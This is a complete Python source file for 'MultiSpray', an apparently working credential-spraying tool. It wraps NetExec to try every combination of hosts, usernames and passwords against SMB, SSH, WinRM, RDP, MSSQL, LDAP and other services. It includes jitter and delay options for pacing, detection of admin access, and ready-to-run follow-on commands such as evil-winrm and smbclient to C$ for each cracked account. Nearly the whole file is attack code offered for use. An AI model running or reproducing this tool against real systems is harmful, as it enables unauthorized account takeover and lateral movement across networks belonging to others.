#!/usr/bin/env python3
"""
multispray.py – MultiSpray v1.0.0
Multi-protocol credential sprayer.

"""

from __future__ import annotations

import argparse
import os
import queue
import random
import shutil
import subprocess
import sys
import threading
import time
from collections import defaultdict

from colorama import Fore, Style, init

__version__ = "1.0.0"

# Force colours even when stdout is piped / redirected.
init(autoreset=True, strip=False)

# ---------------------------------------------------------------------------
# Service map
# ---------------------------------------------------------------------------
SERVICES = {
    "smb":   {"proto": "smb",   "port": 445},
    "ssh":   {"proto": "ssh",   "port": 22},
    "winrm": {"proto": "winrm", "port": 5985},
    "mssql": {"proto": "mssql", "port": 1433},
    "rdp":   {"proto": "rdp",   "port": 3389},
    "ldap":  {"proto": "ldap",  "port": 389},
    "ftp":   {"proto": "ftp",   "port": 21},
    "vnc":   {"proto": "vnc",   "port": 5900},
    "wmi":   {"proto": "wmi",   "port": 135},
    "nfs":   {"proto": "nfs",   "port": 2049},
}
DEFAULT_SERVICES = list(SERVICES.keys())

# ---------------------------------------------------------------------------
# Post-exploitation connect commands (used in the summary)
# ---------------------------------------------------------------------------
CONNECT_CMDS = {
    "smb":       "smbclient -L //{host}/ -U '{login}%{pw}'",
    "smb_admin": "smbclient //{host}/C$ -U '{login}%{pw}'",
    "ssh":       "sshpass -p '{pw}' ssh {user}@{host}",
    "winrm":     "evil-winrm -i {host} -u '{login}' -p '{pw}'",
    "mssql":     "impacket-mssqlclient '{login}':'{pw}'@{host} -windows-auth",
    "rdp":       "xfreerdp /v:{host} /u:'{login}' /p:'{pw}' /cert:ignore /dynamic-resolution",
    "ldap":      "ldapsearch -x -H ldap://{host} -D '{login}' -w '{pw}' -b '' -s base",
    "ftp":       "lftp -u '{user}','{pw}' ftp://{host}",
    "vnc":       "vncviewer {host}    # password: {pw}",
    "wmi":       "nxc wmi {host} -u '{login}' -p '{pw}'",
    "nfs":       "showmount -e {host}    # then: sudo mount -t nfs {host}:/<share> /mnt/nfs",
}

BANNER = (
    f"\n{Fore.CYAN}{Style.BRIGHT}"
    "═══════════════════════════════════════════════════════════════\n"
    f"  MultiSpray v{__version__}  ·  multi-protocol credential sprayer\n"
    "  Developed by Vikas :)\n"
    "═══════════════════════════════════════════════════════════════"
    f"{Style.RESET_ALL}\n"
)

# ---------------------------------------------------------------------------
# Thread-safe printing
# ---------------------------------------------------------------------------
PRINT_LOCK = threading.Lock()

def _print(msg: str) -> None:
    with PRINT_LOCK:
        print(msg)

def info(msg: str) -> None:
    _print(f"{Fore.CYAN}[*] {msg}{Style.RESET_ALL}")

def good(msg: str) -> None:
    _print(f"{Fore.GREEN}{msg}{Style.RESET_ALL}")

def bad(msg: str) -> None:
    _print(f"{Fore.RED}{msg}{Style.RESET_ALL}")

def warn(msg: str) -> None:
    _print(f"{Fore.YELLOW}{msg}{Style.RESET_ALL}")

def admin_tag() -> str:
    return f" {Fore.MAGENTA}{Style.BRIGHT}(ADMIN){Style.RESET_ALL}"

# ---------------------------------------------------------------------------
# Connect-command builder
# ---------------------------------------------------------------------------
def build_connect_cmd(
    service: str,
    host: str,
    user: str,
    password: str,
    domain: str | None = None,
    admin: bool = False,
) -> str | None:
    """Return a ready-to-run command for the given service/credential."""
    login = f"{domain}\\{user}" if domain else user
    key = "smb_admin" if (service == "smb" and admin) else service
    template = CONNECT_CMDS.get(key)
    if not template:
        return None
    return template.format(host=host, user=user, login=login, pw=password)

# ---------------------------------------------------------------------------
# Progress tracker
# ---------------------------------------------------------------------------
class Progress:
    """Thread-safe progress tracker with ETA calculation."""

    def __init__(self, total: int):
        self.total = total
        self.completed = 0
        self.start_time = time.time()
        self._lock = threading.Lock()

    def increment(self) -> None:
        with self._lock:
            self.completed += 1

    def snapshot(self) -> tuple[int, int, float, float, float]:
        with self._lock:
            done = self.completed
            elapsed = time.time() - self.start_time
        remaining = max(0, self.total - done)
        rate = done / elapsed if elapsed > 0 else 0.0
        eta = remaining / rate if rate > 0 else 0.0
        return done, remaining, elapsed, rate, eta

    def format_status(self) -> str:
        done, remaining, elapsed, rate, eta = self.snapshot()
        pct = (done / self.total * 100.0) if self.total else 0.0

        if rate <= 0:
            eta_str = "—"
        elif eta >= 3600:
            eta_str = f"{int(eta // 3600)}h{int((eta % 3600) // 60):02d}m{int(eta % 60):02d}s"
        elif eta >= 60:
            eta_str = f"{int(eta // 60)}m{int(eta % 60):02d}s"
        else:
            eta_str = f"{eta:.1f}s"

        bar_width = 20
        filled = int(bar_width * (done / self.total)) if self.total else 0
        bar = "█" * filled + "░" * (bar_width - filled)

        return (
            f"{Fore.YELLOW}{Style.BRIGHT}[STATUS]{Style.RESET_ALL} "
            f"{Fore.GREEN}{bar}{Style.RESET_ALL} "
            f"{done}/{self.total} ({pct:5.1f}%) | "
            f"Remaining: {Fore.RED}{remaining}{Style.RESET_ALL} | "
            f"Elapsed: {elapsed:.1f}s | "
            f"Rate: {rate:.2f}/s | "
            f"ETA: {Fore.CYAN}{eta_str}{Style.RESET_ALL}"
        )

# ---------------------------------------------------------------------------
# Keypress listener (non-blocking, cross-platform, one print per press)
# ---------------------------------------------------------------------------
def key_listener(progress: Progress, stop_event: threading.Event) -> None:
    """Print current progress whenever the user presses any key (once per press)."""
    try:
        if not sys.stdin.isatty():
            return
    except Exception:
        return

    # ---- Windows ---------------------------------------------------------
    if os.name == "nt":
        try:
            import msvcrt
        except ImportError:
            return
        last_print = 0.0
        while not stop_event.is_set():
            try:
                if msvcrt.kbhit():
                    msvcrt.getch()
                    # Drain the rest of a multi-byte event (arrow / F-keys
                    # send \x00 or \xe0 followed by a second byte).
                    while msvcrt.kbhit():
                        msvcrt.getch()
                    now = time.time()
                    if now - last_print >= 0.15:
                        last_print = now
                        _print(progress.format_status())
            except Exception:
                pass
            stop_event.wait(0.2)
        return

    # ---- POSIX -----------------------------------------------------------
    try:
        import select
        import termios
        import tty
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
    except Exception:
        return

    try:
        try:
            tty.setcbreak(fd)   # no echo, ISIG preserved (Ctrl+C works)
            last_print = 0.0
            while not stop_event.is_set():
                try:
                    r, _, _ = select.select([fd], [], [], 0.2)
                except (OSError, ValueError):
                    break
                if not r:
                    continue

                # Consume the byte that triggered select (unbuffered read —
                # bypasses Python's TextIOWrapper buffering which caused
                # duplicated status prints before).
                try:
                    os.read(fd, 1)
                except OSError:
                    continue

                # Collapse any immediately-available leftovers (escape
                # sequences, arrow keys, auto-repeat) into the SAME event.
                # Bounded so we can't get stuck if the terminal streams input
                # faster than we can drain it.
                for _ in range(16):
                    try:
                        rr, _, _ = select.select([fd], [], [], 0)
                    except (OSError, ValueError):
                        break
                    if not rr:
                        break
                    try:
                        if not os.read(fd, 4096):
                            break
                    except OSError:
                        break

                # 150 ms debounce so a held key or terminal auto-repeat
                # cannot fire more than one status line per burst.
                now = time.time()
                if now - last_print < 0.15:
                    continue
                last_print = now

                _print(progress.format_status())
        finally:
            try:
                termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
            except Exception:
                pass
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Input expansion + de-dup
# ---------------------------------------------------------------------------
def expand(value: str) -> list[str]:
    if os.path.isfile(value):
        with open(value, "r", encoding="utf-8", errors="ignore") as fh:
            return [
                line.strip()
                for line in fh
                if line.strip() and not line.lstrip().startswith("#")
            ]
    return [value.strip()]

def collect(values: list[str]) -> list[str]:
    out: list[str] = []
    for v in values:
        out.extend(expand(v))
    return list(dict.fromkeys(out))

# ---------------------------------------------------------------------------
# NetExec runner
# ---------------------------------------------------------------------------
def run_nxc(
    proto: str,
    host: str,
    username: str,
    password: str,
    domain: str | None = None,
    local_auth: bool = False,
    timeout: int = 60,
) -> tuple[bool, bool, str, str | None]:
    cmd = ["nxc", proto, host, "-u", username, "-p", password]
    if domain:
        cmd += ["-d", domain]
    if local_auth:
        cmd.append("--local-auth")

    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, check=False,
        )
        raw = (proc.stdout or "") + (proc.stderr or "")
        success = "[+]" in raw
        admin = "(Pwn3d!)" in raw
        return success, admin, raw, None
    except subprocess.TimeoutExpired:
        return False, False, "", f"Timeout after {timeout}s"
    except FileNotFoundError:
        return False, False, "", "nxc not found in PATH"
    except Exception as exc:                     # noqa: BLE001
        return False, False, "", str(exc)

# ---------------------------------------------------------------------------
# Worker
# ---------------------------------------------------------------------------
def worker(
    task_q: "queue.Queue[tuple[str, str, str, str]]",
    results: list,
    progress: Progress,
    args: argparse.Namespace,
) -> None:
    while True:
        try:
            host, service, username, password = task_q.get_nowait()
        except queue.Empty:
            break

        proto = SERVICES[service]["proto"]

        if args.jitter:
            time.sleep(random.uniform(0, args.jitter))
        if args.delay:
            time.sleep(args.delay)

        success, admin, raw, err = run_nxc(
            proto=proto,
            host=host,
            username=username,
            password=password,
            domain=args.domain,
            local_auth=args.local_auth,
            timeout=args.timeout,
        )

        results.append({
            "host": host, "service": service,
            "username": username, "password": password,
            "success": success, "admin": admin,
            "raw": raw, "error": err,
        })

        if success:
            extra = admin_tag() if admin else ""
            good(f"[+] {host} {service.upper():8} {username}:{password}{extra}")
        elif args.verbose and err:
            bad(f"[-] {host} {service.upper():8} {username}:{password}  ({err})")
        elif args.verbose:
            bad(f"[-] {host} {service.upper():8} {username}:{password}")

        progress.increment()
        task_q.task_done()

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="multispray",
        add_help=False,
        description="MultiSpray – multi-protocol credential sprayer (wraps NetExec).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Flag conventions\n"
            "  Lower-case (-h, -u, -p) → single value\n"
            "  Upper-case (-H, -U, -P) → file containing one value per line\n\n"
            "Examples\n"
            "  Single host / user / password (all services):\n"
            "    multispray -h 10.0.0.5 -u administrator -p 'P@ssw0rd'\n\n"
            "  Lists, SMB + SSH only:\n"
            "    multispray -H hosts.txt -U users.txt -P pass.txt --services smb,ssh\n\n"
            "  Mix single + list:\n"
            "    multispray -h 10.0.0.5 -U users.txt -p 'Summer2025!' --threads 3 --jitter 2\n\n"
            "  Verbose + export hits:\n"
            "    multispray -H hosts.txt -U users.txt -P pass.txt --verbose --output hits.tsv\n\n"
            "  Preview combinations only:\n"
            "    multispray -H hosts.txt -U users.txt -P pass.txt --dry-run\n\n"
            "Live progress\n"
            "  While spraying, press ANY key to print a live status line.\n"
            "  Ctrl+C still aborts cleanly.\n\n"
            "Summary\n"
            "  Every successful hit is followed by a ready-to-run connect\n"
            "  command (smbclient / evil-winrm / xfreerdp / impacket ...).\n\n"
            f"Available services: {', '.join(SERVICES)}\n"
        ),
    )

    parser.add_argument("-h", "--host",     action="append", default=[], metavar="HOST",
                        help="Single target host (IP/hostname). Repeatable.")
    parser.add_argument("-H", "--hosts",    action="append", default=[], metavar="FILE",
                        help="File with one host per line.")
    parser.add_argument("-u", "--user",     action="append", default=[], metavar="USER",
                        help="Single username. Repeatable.")
    parser.add_argument("-U", "--users",    action="append", default=[], metavar="FILE",
                        help="File with one username per line.")
    parser.add_argument("-p", "--password", action="append", default=[], metavar="PASS",
                        help="Single password. Repeatable.")
    parser.add_argument("-P", "--passwords", action="append", default=[], metavar="FILE",
                        help="File with one password per line.")

    parser.add_argument("--services", default=None,
                        help=f"Comma-separated services. Default: all ({','.join(SERVICES)}).")
    parser.add_argument("--domain", default=None, help="Domain for authentication.")
    parser.add_argument("--local-auth", action="store_true",
                        help="Use local authentication (SMB/WinRM/etc.).")
    parser.add_argument("--threads", type=int, default=5,
                        help="Concurrent workers (default: 5).")
    parser.add_argument("--timeout", type=int, default=60,
                        help="Timeout per attempt in seconds (default: 60).")
    parser.add_argument("--jitter", type=float, default=0,
                        help="Random delay 0–JITTER seconds before each attempt.")
    parser.add_argument("--delay", type=float, default=0,
                        help="Fixed delay in seconds before each attempt.")
    parser.add_argument("--verbose", action="store_true",
                        help="Also print failed attempts.")
    parser.add_argument("--output", default=None,
                        help="Write successful hits to a TSV file.")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show task list without executing.")
    parser.add_argument("--version", action="version",
                        version=f"MultiSpray {__version__}")
    parser.add_argument("--help", action="help",
                        help="Show this help message and exit.")
    return parser

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = build_parser()
    args = parser.parse_args()

    print(BANNER)

    hosts = list(dict.fromkeys(collect(args.host) + collect(args.hosts)))
    users = list(dict.fromkeys(collect(args.user) + collect(args.users)))
    passwords = list(dict.fromkeys(collect(args.password) + collect(args.passwords)))

    if not hosts:
        parser.error("No hosts provided. Use -h HOST and/or -H FILE.")
    if not users:
        parser.error("No usernames provided. Use -u USER and/or -U FILE.")
    if not passwords:
        parser.error("No passwords provided. Use -p PASS and/or -P FILE.")

    if args.services:
        selected = [s.strip().lower() for s in args.services.split(",")]
        invalid = [s for s in selected if s not in SERVICES]
        if invalid:
            bad(f"Unknown service(s): {', '.join(invalid)}")
            info(f"Valid services: {', '.join(SERVICES)}")
            sys.exit(1)
    else:
        selected = DEFAULT_SERVICES

    total = len(hosts) * len(selected) * len(users) * len(passwords)
    info(f"Targets : {len(hosts)} host(s), {len(users)} user(s), "
         f"{len(passwords)} password(s), {len(selected)} service(s)")
    info(f"Attempts: {total}")

    if args.dry_run:
        for h in hosts:
            for svc in selected:
                for u in users:
                    for p in passwords:
                        print(f"DRY  {h:20} {svc.upper():8} {u}:{p}")
        return

    if shutil.which("nxc") is None:
        bad("NetExec (nxc) not found in PATH. Install it first: pipx install netexec")
        sys.exit(1)

    # ---- Build task queue ---------------------------------------------------
    task_q: "queue.Queue[tuple[str, str, str, str]]" = queue.Queue()
    for h in hosts:
        for svc in selected:
            for u in users:
                for p in passwords:
                    task_q.put((h, svc, u, p))

    progress = Progress(total)

    results: list[dict] = []
    threads: list[threading.Thread] = []
    worker_count = max(1, min(args.threads, task_q.qsize()))
    info(f"Starting {worker_count} worker(s)…")

    # Start keyboard listener
    stop_event = threading.Event()
    listener = threading.Thread(
        target=key_listener, args=(progress, stop_event), daemon=True,
    )
    listener.start()
    info("Press ANY key at any time to show live progress (Ctrl+C to abort).")

    for _ in range(worker_count):
        t = threading.Thread(target=worker, args=(task_q, results, progress, args), daemon=True)
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        warn("\n[!] Interrupted – waiting for active workers to finish…")
        for t in threads:
            t.join(timeout=5)
    finally:
        stop_event.set()
        if listener.is_alive():
            listener.join(timeout=2)

    # ---- Summary ------------------------------------------------------------
    print(f"\n{Fore.CYAN}{Style.BRIGHT}{'='*60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}  SPRAY SUMMARY{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}{'='*60}{Style.RESET_ALL}")

    grouped: dict[str, list] = defaultdict(list)
    for r in results:
        if r["success"]:
            grouped[r["host"]].append(r)

    if not grouped:
        bad("No successful credentials found.")
    else:
        for host in sorted(grouped):
            print(f"\n{Fore.YELLOW}{Style.BRIGHT}Host: {host}{Style.RESET_ALL}")
            for hit in sorted(grouped[host], key=lambda x: x["service"]):
                extra = admin_tag() if hit["admin"] else ""
                good(f"  {hit['service'].upper():8}  "
                     f"{hit['username']}:{hit['password']}{extra}")
                cmd = build_connect_cmd(
                    hit["service"], host, hit["username"], hit["password"],
                    domain=args.domain, admin=hit["admin"],
                )
                if cmd:
                    print(f"           {Fore.CYAN}→ {cmd}{Style.RESET_ALL}")

    # ---- TSV export ---------------------------------------------------------
    if args.output:
        with open(args.output, "w", encoding="utf-8") as fh:
            fh.write("host\tservice\tusername\tpassword\tadmin\tconnect_cmd\n")
            for r in results:
                if r["success"]:
                    cmd = build_connect_cmd(
                        r["service"], r["host"], r["username"], r["password"],
                        domain=args.domain, admin=r["admin"],
                    ) or ""
                    fh.write(
                        f"{r['host']}\t{r['service']}\t{r['username']}\t"
                        f"{r['password']}\t{r['admin']}\t{cmd}\n"
                    )
        info(f"Successful hits saved to {args.output}")

    hits = sum(1 for r in results if r["success"])
    admins = sum(1 for r in results if r["success"] and r["admin"])
    info(f"Finished – {hits} successful credential(s), {admins} with admin rights.")


if __name__ == "__main__":
    main()
